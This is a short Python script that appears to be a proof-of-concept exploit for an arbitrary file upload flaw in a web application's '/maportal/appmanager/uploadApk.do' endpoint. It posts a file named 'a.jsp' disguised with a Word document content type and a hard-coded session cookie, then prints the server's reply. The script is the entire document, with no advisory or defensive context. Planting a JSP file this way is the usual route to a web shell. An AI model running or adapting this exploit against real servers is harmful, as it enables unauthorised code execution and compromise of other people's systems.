# -*- coding: utf-8 -*-  
import requests  
  
url = "http://127.0.0.1/maportal/appmanager/uploadApk.do?pk_obj="  
  
headers = {  
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3",  
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",  
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",  
    "Cookie": "JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server",  
    "Connection": "close"  
}  
  
files = {  
    "downloadpath": ("a.jsp", "hello", {"Content-Type": "application/msword"})  
}  
  
response = requests.post(url, headers=headers, files=files)  
print(response.text)